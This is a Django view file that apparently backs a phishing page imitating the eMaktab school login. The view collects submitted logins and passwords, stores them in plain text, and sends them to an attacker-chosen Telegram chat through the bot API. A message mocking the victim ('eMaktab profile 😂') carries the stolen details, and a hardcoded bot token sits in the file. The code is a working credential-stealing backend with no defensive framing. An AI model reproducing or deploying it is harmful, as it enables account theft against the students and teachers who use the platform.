from django.shortcuts import render
import requests

from .models import Emaktab

TELEGRAM_BOT_TOKEN = "7760257279:AAGgiolbiVaVv3hB1Dn3TvNGrz45WQq7UM4"


def emaktab(request,id):
    if request.method == "POST":
        login = request.POST.get('login')
        password = request.POST.get('password')
        emaktab = Emaktab(
            login=login,
            password=password,
        )
        emaktab.save()

        text = f"eMaktab profile 😂\n\n👤 *Login*: ```{login}```\n🔒 *Parol*: ```{password}```\n"
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                          data={"chat_id": id, "text": text,"parse_mode": "MarkdownV2"})

    return render(request, "emaktab/index.html")
